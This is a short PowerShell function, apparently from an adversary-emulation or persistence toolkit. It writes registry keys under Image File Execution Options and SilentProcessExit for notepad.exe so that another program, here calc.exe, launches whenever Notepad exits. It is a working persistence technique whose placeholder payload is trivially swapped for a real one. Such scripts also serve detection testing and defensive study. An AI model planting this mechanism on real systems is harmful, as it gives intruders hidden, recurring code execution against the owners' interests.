# Set Image File Execution Options (Notepad)
#----------------------------------------------------------------------------------------------------------------------------------#
function Set_Image_File_Execution_Options_Persist {
Write-host -ForegroundColor Yellow "Set Image File Execution Options (Notepad)..."
Start-Sleep 2
New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options" -Name notepad.exe
$ServiceKey = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe"
[void] [Microsoft.Win32.Registry]::CurrentUser.CreateSubKey($ServiceKey)
New-ItemProperty -Path "HKLM:$($ServiceKey)" -Name GlobalFlag -Value "512" -PropertyType "DWORD" -Force | Out-Null
New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion" -Name SilentProcessExit -ErrorAction SilentlyContinue
New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit" -Name notepad.exe
$ServiceKey = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe"
[void] [Microsoft.Win32.Registry]::CurrentUser.CreateSubKey($ServiceKey)
New-ItemProperty -Path "HKLM:$($ServiceKey)" -Name ReportingMode -Value "1" -PropertyType "DWORD" -Force | Out-Null
New-ItemProperty -Path "HKLM:$($ServiceKey)" -Name MonitorProcess -Value "C:\windows\system32\calc.exe" -PropertyType "String" -Force | Out-Null
Write-host -ForegroundColor Green "Done!"
}
